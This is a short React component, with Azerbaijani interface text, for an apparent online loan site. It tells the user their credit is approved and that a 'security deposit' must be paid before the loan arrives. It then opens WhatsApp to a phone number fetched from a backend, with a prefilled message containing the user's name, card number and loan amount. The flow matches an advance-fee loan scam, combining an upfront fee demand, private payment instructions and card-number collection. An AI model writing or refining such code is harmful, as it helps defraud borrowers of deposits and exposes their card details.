import React, { useState,useEffect } from "react";
import { useData } from "../../hook/hook";




export function SendLast(){
const{data,refetch}=useData();
const [nomre, setnomre] = useState(null);    
const{name,fincode,username,mobile}=JSON.parse(localStorage.getItem("information")) || {};;
const{depozit,money,mounts,rates,ratmoney,resultat,totaals,cart}=JSON.parse(localStorage.getItem("person")) || {};;
useEffect(()=>{
    if (data) {
        
          
        setnomre(data[0])
    }
},[data]);   



  const phone = `${nomre?.mobil}`;
  const message = 
  `Salam!

  👤 AD SOYAD:${name} ${username}
  💳 Kart nömrəsi:${cart}
  💰 KREDIT MƏBLƏĞİ:${money}AZN
  💰 Depozit məbləği: ${depozit} ₼ 

  Depozit məbləğini hara ödəyim?.Təlimatlarınızı gözləyirəm.
  `
  const url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
    return(<div className="boddy">

       <div className="sended">
           <div className="sd-head">
            <h3>Kreditiniz təstiqləndi</h3>
            <h5>Son addım: Depozit ödənişi</h5>
           </div>
           <div className="sd-dep">
            <h5>Depozit Məlumatları</h5>
            <div className="l-one">
                <p>AZMANAT MMC</p>
            </div>
            <div className="l-one">
                <p className="l123">Məbləğ:</p>
                <p className="yellow">{depozit} ₼</p>
            </div>
            <div className="l-one">
                <p className="l123">Ödənişdən sonra kredit 5-10 dəqiqə ərzində köçürüləcək</p>
            </div>
            <div className="s-footer">
                <button disabled={!phone} onClick={phone?() => window.open(url, "_blank"):()=>console.log('islemir')}>Ödənişə keç</button>
                
            </div>
           </div>

             <div className="sd-sds">
                <p className="cube"><span>₼</span></p>

                <p>Depozit: <span className="yellows">{depozit} ₼</span> </p>
                <p className="filters">Depozit ödənişi kreditin aktivləşdirilməsi üçün tələb olunan təhlükəsizlik məbləğidir. Bu məbləğ ödənildikdən sonra seçdiyiniz kredit məbləği birbaşa kartınıza köçürüləcək.</p>
             </div>
       </div>
    </div>)
}